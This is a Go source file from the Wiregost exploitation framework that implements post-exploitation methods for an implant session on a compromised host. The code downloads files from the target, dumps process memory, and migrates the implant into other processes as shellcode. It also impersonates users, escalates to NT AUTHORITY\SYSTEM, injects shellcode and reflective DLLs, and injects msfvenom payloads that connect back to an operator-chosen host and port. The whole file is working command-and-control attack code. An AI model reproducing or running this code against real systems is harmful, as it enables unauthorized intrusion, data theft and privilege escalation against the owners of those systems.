// Wiregost - Golang Exploitation Framework
// Copyright © 2020 Para
//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program.  If not, see <http://www.gnu.org/licenses/>.

package module

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"path"
	"path/filepath"
	"strings"
	"time"

	"github.com/evilsocket/islazy/tui"
	"github.com/gogo/protobuf/proto"

	clientpb "github.com/maxlandon/wiregost/protobuf/client"
	ghostpb "github.com/maxlandon/wiregost/protobuf/ghost"
	"github.com/maxlandon/wiregost/server/assets"
	"github.com/maxlandon/wiregost/server/core"
	"github.com/maxlandon/wiregost/server/generate"
	"github.com/maxlandon/wiregost/server/msf"
	"github.com/maxlandon/wiregost/util"
)

// Post - A type of module performing post-exploitation tasks
type Post struct {
	*Module
	Session *core.Ghost
}

func NewPost() *Post {
	post := &Post{&Module{}, nil}
	return post
}

// This file contains all methods accessible by Post-modules for interacting with an implant session.
// They are identical to the commands available in the console for using sessions
// - Filesystem
// - Info
// - Proc
// - Priv
// - Execute

// GetSession - Returns the Session corresponding to the Post "Session" option, or nothing if not found.
func (m *Post) GetSession() (err error) {

	// Check empty session
	if m.Options["Session"].Value == "" {
		return errors.New("Provide a Session to run this module on.")
	}

	// Check connected session
	if 0 < len(*core.Wire.Ghosts) {
		for _, g := range *core.Wire.Ghosts {
			if g.Name == m.Options["Session"].Value {
				m.Session = g
			}
		}
	}

	if m.Session == nil {
		invalid := fmt.Sprintf("Invalid or non-connected session: %s", m.Options["Session"].Value)
		return errors.New(invalid)
	}

	// Check valid platform
	platform := ""
	switch m.Platform {
	case "windows", "win", "Windows":
		platform = "windows"
	case "darwin", "ios", "macos", "MacOS", "Apple":
		platform = "darwin"
	case "Linux", "linux":
		platform = "linux"
	}

	if platform != m.Session.OS {
		return errors.New("The session's target OS is not supported by this module")
	}

	return nil
}

// -----------------------------------------------------------------------------------------------------------//
// [ FILESYSTEM METHODS ]
// -----------------------------------------------------------------------------------------------------------//

// Upload - Upload a file on the Session's target.
// @src     => file to upload
// @path    => path in which to upload the file (including file name)
// @timeout => Desired timeout for the session command
func (m *Post) Upload(src string, path string, timeout time.Duration) (result string, err error) {

	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}

	fileBuf, err := ioutil.ReadFile(src)
	if err != nil {
		return "", err
	}
	uploadGzip := bytes.NewBuffer([]byte{})
	new(util.Gzip).Encode(uploadGzip, fileBuf)

	data, _ := proto.Marshal(&ghostpb.UploadReq{
		Encoder: "gzip",
		Path:    path,
		Data:    uploadGzip.Bytes(),
	})

	data, err = m.Session.Request(ghostpb.MsgUploadReq, timeout, data)
	if err != nil {
		return "", errors.New(err.Error())
	}
	return "Uploaded", nil
}

// Download - Download a file from the Session's target.
// @lpath   => local path in which to save the file
// @rpath   => path to file to download (including file name)
// @timeout => Desired timeout for the session command
func (m *Post) Download(lpath string, rpath string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}

	data, _ := proto.Marshal(&ghostpb.DownloadReq{
		Path: rpath,
	})
	data, err = m.Session.Request(ghostpb.MsgDownloadReq, timeout, data)

	src := rpath
	fileName := filepath.Base(src)
	dst, _ := filepath.Abs(lpath)
	fi, err := os.Stat(dst)
	if err != nil {
		errStat := fmt.Sprintf("%v\n", err)
		return "", errors.New(errStat)
	}
	if fi.IsDir() {
		dst = path.Join(dst, fileName)
	}

	download := &ghostpb.Download{}
	proto.Unmarshal(data, download)
	if download.Encoder == "gzip" {
		download.Data, _ = new(util.Gzip).Decode(download.Data)
	}
	f, err := os.Create(dst)
	if err != nil {
		return "", fmt.Errorf("Failed to open local file %s: %v\n", dst, err)
	}
	defer f.Close()
	n, err := f.Write(download.Data)
	if err != nil {
		return "", fmt.Errorf("Failed to write data %v\n", err)
	}
	return fmt.Sprintf("Wrote %d bytes to %s\n", n, dst), nil
}

// Remove - Remove a file/directory from the Session's target.
// @path    => path to file/directory to remove
// @timeout => Desired timeout for the session command
func (m *Post) Remove(path string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}
	sess := m.Session

	data, _ := proto.Marshal(&ghostpb.RmReq{
		Path: path,
	})
	data, err = sess.Request(ghostpb.MsgRmReq, timeout, data)
	if err != nil {
		return "", err
	}
	rm := &ghostpb.Rm{}
	err = proto.Unmarshal(data, rm)
	if err != nil {
		errRm := fmt.Sprintf("Unmarshaling envelope error: %v\n", err)
		return "", errors.New(errRm)
	}
	if rm.Success {
		return "Deleted", nil
	}
	return "", errors.New(rm.Err)
}

// ChangeDirectory - Change the implant session's current working directory.
// @dir     => target directory
// @timeout => Desired timeout for the session command
func (m *Post) ChangeDirectory(dir string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}
	sess := m.Session

	data, _ := proto.Marshal(&ghostpb.CdReq{
		Path: dir,
	})
	data, err = sess.Request(ghostpb.MsgCdReq, timeout, data)
	if err != nil {
		return "", err
	}
	pwd := &ghostpb.Pwd{}
	err = proto.Unmarshal(data, pwd)
	if err != nil {
		return "", fmt.Errorf("Unmarshaling envelope error: %v\n", err)
	}
	return fmt.Sprintf("Changed directory: %s", pwd), nil
}

// ListDirectory - List contents of a directory on the session's target.
// @path    => target directory to list content from
// @timeout => Desired timeout for the session command
func (m *Post) ListDirectory(path string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}
	sess := m.Session

	data, _ := proto.Marshal(&ghostpb.LsReq{
		Path: path,
	})
	data, err = sess.Request(ghostpb.MsgLsReq, timeout, data)
	if err != nil {
		return "", err
	}
	dirList := &ghostpb.Ls{}
	err = proto.Unmarshal(data, dirList)
	if err != nil {
		errLs := fmt.Sprintf("Unmarshaling envelope error: %v\n", err)
		return "", errors.New(errLs)
	}
	return fmt.Sprintf("directory: %s", dirList), nil
}

// -----------------------------------------------------------------------------------------------------------//
// [ PROC METHODS ]
// -----------------------------------------------------------------------------------------------------------//

// Ps - Returns a list of all processes running on the session's target.
func (m *Post) Ps(timeout time.Duration) (procs []*ghostpb.Process, err error) {
	err = m.GetSession()
	if err != nil {
		return nil, errors.New("Error finding ghost Session when list processes")
	}
	sess := m.Session

	data, _ := proto.Marshal(&ghostpb.PsReq{GhostID: sess.ID})
	data, err = sess.Request(ghostpb.MsgPsReq, timeout, data)
	if err != nil {
		return nil, err
	}

	ps := ghostpb.Ps{}
	err = proto.Unmarshal(data, &ps)
	if err != nil {
		return nil, err
	}

	return ps.Processes, nil
}

// Terminate - Terminate a program on the target, given a PID
func (m *Post) Terminate(pid int, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}
	sess := m.Session

	data, _ := proto.Marshal(&ghostpb.TerminateReq{Pid: int32(pid)})
	data, err = sess.Request(ghostpb.MsgTerminate, timeout, data)
	if err != nil {
		return "", err
	}

	termResp := &ghostpb.Terminate{}
	err = proto.Unmarshal(data, termResp)
	if err != nil {
		return "", err
	}
	if termResp.Err != "" {
		return "", err
	}

	return "", nil
}

// GetPIDByName - Get the Process ID of a process given its name. Returns -1, err if no process is found
func (m *Post) GetPIDByName(name string, timeout time.Duration) (pid int, err error) {

	procs, err := m.Ps(timeout)
	if err != nil {
		return -1, err
	}
	for _, proc := range procs {
		if proc.Executable == name {
			return int(proc.Pid), nil
		}
	}
	return -1, nil
}

// Migrate - Migrate to a process, given its PID, by generating and executing an implant as shellcode in the target.
func (m *Post) Migrate(pid int, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}
	sess := m.Session

	conf := getSessionGhostConfig(sess)
	config := generate.GhostConfigFromProtobuf(conf)
	config.Format = clientpb.GhostConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	m.Event("Generating implant shellcode for migration")
	dllPath, err := generate.GhostSharedLibrary(config)
	if err != nil {
		return "", err
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
	if err != nil {
		return "", err
	}
	data, _ := proto.Marshal(&ghostpb.MigrateReq{
		Data: shellcode,
		Pid:  uint32(pid),
	})
	m.Event("Migrating...")
	data, err = sess.Request(ghostpb.MsgMigrateReq, timeout, data)
	if err != nil {
		return "", err
	}

	migReq := &ghostpb.Migrate{}
	err = proto.Unmarshal(data, migReq)
	if migReq.Err != "" {
		return "", errors.New(migReq.Err)
	}
	m.Event(tui.Green("Done"))

	return "", nil
}

func getSessionGhostConfig(sess *core.Ghost) *clientpb.GhostConfig {
	c2s := []*clientpb.GhostC2{}
	c2s = append(c2s, &clientpb.GhostC2{
		URL:      sess.ActiveC2,
		Priority: uint32(0),
	})
	config := &clientpb.GhostConfig{
		GOOS:   sess.OS,
		GOARCH: sess.Arch,
		Debug:  true,

		MaxConnectionErrors: uint32(1000),
		ReconnectInterval:   uint32(60),

		Format:      clientpb.GhostConfig_SHELLCODE,
		IsSharedLib: true,
		C2:          c2s,
	}
	return config
}

// ProcDump - Dumps the memory of a process given its PID. Returns the path of the file
// containing the dump, and an error
func (m *Post) ProcDump(pid int, timeout time.Duration) (tmp string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}
	sess := m.Session

	data, _ := proto.Marshal(&ghostpb.ProcessDumpReq{
		Pid: int32(pid),
	})

	m.Event(fmt.Sprintf("Dumping memory of process %d", pid))
	data, err = sess.Request(ghostpb.MsgProcessDumpReq, timeout, data)
	if err != nil {
		return "", err
	}

	procDump := &ghostpb.ProcessDump{}
	proto.Unmarshal(data, procDump)
	if procDump.Err != "" {
		return "", err
	}

	hostname := sess.Hostname
	temp := path.Base(fmt.Sprintf("procdump_%s_%d_*", hostname, pid))
	f, err := ioutil.TempFile("", temp)
	if err != nil {
		return "", nil
	}
	f.Write(procDump.GetData())
	m.Event(fmt.Sprintf("Process dump stored in %s\n", f.Name()))

	return f.Name(), nil
}

// -----------------------------------------------------------------------------------------------------------//
// [ PRIV METHODS ]
// -----------------------------------------------------------------------------------------------------------//

// RunAs - (WINDOWS ONLY) Run a program located at @path, as user @username.
// @username - User to impersonate
// @process - Path to process to run
// @args - Optional list of arguments to run with the process
func (m *Post) RunAs(username, process string, args []string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}

	data, _ := proto.Marshal(&ghostpb.RunAsReq{
		Username: username,
		Process:  process,
		Args:     strings.Join(args, " "),
		GhostID:  m.Session.ID,
	})

	m.Event(fmt.Sprintf("Runinng %s as '%s'", process, username))
	data, err = m.Session.Request(ghostpb.MsgRunAs, timeout, data)
	if err != nil {
		return "", nil
	}
	runAs := &ghostpb.RunAs{}
	err = proto.Unmarshal(data, runAs)
	if runAs.Err != "" {
		return "", errors.New(runAs.Err)
	}
	m.Event(runAs.Output)

	return "", nil
}

// Impersonate - (WINDOWS ONLY) Impersonate a user on the target.
// @username - User to impersonate
func (m *Post) Impersonate(username string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}

	data, _ := proto.Marshal(&ghostpb.ImpersonateReq{
		Username: username,
	})
	m.Event(fmt.Sprintf("Impersonating user '%s'", username))
	data, err = m.Session.Request(ghostpb.MsgImpersonateReq, timeout, data)

	resp := &ghostpb.Impersonate{}
	err = proto.Unmarshal(data, resp)
	if resp.Err != "" {
		return "", errors.New(resp.Err)
	}

	return "", nil
}

// Rev2Self - Revert back from impersonation.
func (m *Post) Rev2Self(timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}

	m.Event("Reverting from user impersonation...")
	data, _ := proto.Marshal(&ghostpb.RevToSelfReq{})
	data, err = m.Session.Request(ghostpb.MsgRevToSelf, timeout, data)

	resp := &ghostpb.RevToSelf{}
	err = proto.Unmarshal(data, resp)
	if resp.Err != "" {
		return "", errors.New(resp.Err)
	}

	return "", nil
}

// GetSystem - (WINDOWS ONLY) Run process located at @process, in order to get NT AUTHORITY\SYSTEM,
func (m *Post) GetSystem(process string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}

	conf := getSessionGhostConfig(m.Session)
	config := generate.GhostConfigFromProtobuf(conf)
	config.Format = clientpb.GhostConfig_SHARED_LIB
	config.ObfuscateSymbols = false
	dllPath, err := generate.GhostSharedLibrary(config)
	if err != nil {
		return "", err
	}
	shellcode, err := generate.ShellcodeRDI(dllPath, "", "")
	if err != nil {
		return "", err
	}
	data, _ := proto.Marshal(&ghostpb.GetSystemReq{
		Data:           shellcode,
		HostingProcess: process,
	})

	m.Event("Attempting to create a new Ghost implant session as 'NT AUTHORITY\\SYSTEM'...")
	data, err = m.Session.Request(ghostpb.MsgGetSystemReq, timeout, data)

	gsResp := &ghostpb.GetSystem{}
	err = proto.Unmarshal(data, gsResp)
	if err != nil {
		return "", err
	}

	return gsResp.Output, nil
}

// -----------------------------------------------------------------------------------------------------------//
// [ EXECUTE METHODS ]
// -----------------------------------------------------------------------------------------------------------//

// Execute - Execute a program on the session's target.
// @path    => path to the program to run
// @args    => optional list of arguments to run with the program (if none, use []string{})
// @timeout => Desired timeout for the session command
func (m *Post) Execute(path string, args []string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when uploading")
	}
	sess := m.Session

	data, _ := proto.Marshal(&ghostpb.ExecuteReq{
		Path:   path,
		Args:   args,
		Output: true,
	})
	data, err = sess.Request(ghostpb.MsgExecuteReq, timeout, data)
	if err != nil {
		return "", err
	}

	resp := ghostpb.Execute{}
	err = proto.Unmarshal(data, &resp)
	if err != nil {
		return "", err
	}
	if resp.Error != "" {
		return "", errors.New(resp.Error)
	}

	res := fmt.Sprintf("Results:\n %s", resp.Result)
	return res, nil
}

// ExecuteAssembly - Execute a DLL assembly located at @path into a child process, with optional arguments.
func (m *Post) ExecuteAssembly(dll, process string, args []string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}

	assemblyBytes, err := ioutil.ReadFile(dll)
	if err != nil {
		return "", fmt.Errorf("Error reading DLL file: %s", err.Error())
	}

	hostingDllPath := assets.GetDataDir() + "/HostingCLRx64.dll"
	hostingDllBytes, err := ioutil.ReadFile(hostingDllPath)
	if err != nil {
		return "", fmt.Errorf("Could not find hosting dll in %s", assets.GetDataDir())
	}
	data, _ := proto.Marshal(&ghostpb.ExecuteAssemblyReq{
		Assembly:   assemblyBytes,
		HostingDll: hostingDllBytes,
		Arguments:  strings.Join(args, " "),
		Process:    process,
		Timeout:    int32(timeout),
		GhostID:    m.Session.ID,
	})

	m.Event(fmt.Sprintf("Sending execute assembly request to ghost %d\n", m.Session.ID))
	data, err = m.Session.Request(ghostpb.MsgExecuteAssemblyReq, timeout, data)
	if err != nil {
		return "", err
	}

	execResp := &ghostpb.ExecuteAssembly{}
	proto.Unmarshal(data, execResp)
	if execResp.Error != "" {
		return "", errors.New(execResp.Error)
	}
	m.Event(fmt.Sprintf("Assembly output:\n%s", execResp.Output))

	return "", nil
}

// ExecuteShellcode - Load and execute a shellcode in a process.
func (m *Post) ExecuteShellcode(shellcodePath string, pid int, rwxPages bool, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}

	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
	if err != nil {
		return "", fmt.Errorf("Error: %s\n", err.Error())
	}

	data, _ := proto.Marshal(&clientpb.TaskReq{
		Data:     shellcodeBin,
		RwxPages: rwxPages,
		Pid:      uint32(pid),
	})

	m.Event(fmt.Sprintf("Sending shellcode to %s ...", m.Session.Name))
	data, err = m.Session.Request(ghostpb.MsgTask, timeout, data)
	if err != nil {
		return "", err
	}

	resp := &ghostpb.Envelope{}
	err = proto.Unmarshal(data, resp)

	if resp.Err != "" {
		return "", errors.New(resp.Err)
	}

	return "", nil
}

// SideloadDLL - Load a DLL into a process.
func (m *Post) SideloadDLL(dll, entryPoint, process string, args []string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}

	binData, err := ioutil.ReadFile(dll)
	if err != nil {
		return "", err
	}
	shellcode, err := generate.ShellcodeRDIFromBytes(binData, entryPoint, strings.Join(args, " "))
	if err != nil {
		return "", err
	}

	data, _ := proto.Marshal(&clientpb.SideloadReq{
		Data:     shellcode,
		ProcName: process,
		GhostID:  m.Session.ID,
	})

	m.Event(fmt.Sprintf("Sideloading %s ...", dll))
	data, err = m.Session.Request(ghostpb.MsgSideloadReq, timeout, data)
	if err != nil {
		return "", err
	}

	execResp := &ghostpb.Sideload{}
	proto.Unmarshal(data, execResp)
	if execResp.Error != "" {
		return "", err
	}
	if len(execResp.Result) > 0 {
		m.Event(fmt.Sprintf("Output:\n%s", execResp.Result))
	}
	return "", nil
}

// SpawnDLL - Load and execute a Reflective DLL into a process.
func (m *Post) SpawnDLL(dll, export, process string, args []string, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}

	offset, err := getExportOffset(dll, export)
	if err != nil {
		return "", err
	}

	binData, err := ioutil.ReadFile(dll)
	if err != nil {
		return "", nil
	}
	data, _ := proto.Marshal(&ghostpb.SpawnDllReq{
		Data:     binData,
		Args:     strings.Join(args, " "),
		ProcName: process,
		Offset:   offset,
		GhostID:  m.Session.ID,
	})

	m.Event(fmt.Sprintf("Executing reflective dll %s", dll))
	data, err = m.Session.Request(ghostpb.MsgSpawnDllReq, timeout, data)
	if err != nil {
		return "", err
	}

	execResp := &ghostpb.SpawnDll{}
	proto.Unmarshal(data, execResp)
	if execResp.Error != "" {
		return "", errors.New(execResp.Error)
	}
	if len(execResp.Result) > 0 {
		m.Event(fmt.Sprintf("Output:\n%s", execResp.Result))
	}

	return "", nil
}

// InjectMSFPayload - Generate, load and execute a MSF payload into a process, given its PID.
func (m *Post) InjectMSFPayload(payload, lhost string, lport int, pid int, encoder string, iters int, timeout time.Duration) (result string, err error) {
	err = m.GetSession()
	if err != nil {
		return "", errors.New("Error finding ghost Session when list processes")
	}

	config := msf.VenomConfig{
		Os:         m.Session.OS,
		Arch:       msf.Arch(m.Session.Arch),
		Payload:    payload,
		LHost:      lhost,
		LPort:      uint16(lport),
		Encoder:    encoder,
		Iterations: iters,
		Format:     "raw",
	}
	rawPayload, err := msf.VenomPayload(config)
	if err != nil {
		return "", fmt.Errorf("Error while generating msf payload: %v\n", err)

	}
	data, _ := proto.Marshal(&ghostpb.RemoteTask{
		Pid:      uint32(pid),
		Encoder:  "raw",
		Data:     rawPayload,
		RWXPages: true,
	})

	msg := fmt.Sprintf("Injecting payload %s %s/%s -> %s:%d ...",
		payload, m.Session.OS, m.Session.Arch, lhost, lport)
	m.Event(msg)
	data, err = m.Session.Request(ghostpb.MsgRemoteTask, timeout, data)
	if err != nil {
		return "", err
	}

	resp := &ghostpb.Envelope{}
	err = proto.Unmarshal(data, resp)
	if resp.Err != "" {
		return "", errors.New(resp.Err)
	}

	m.Event("Executed payload on target")
	return "", nil
}
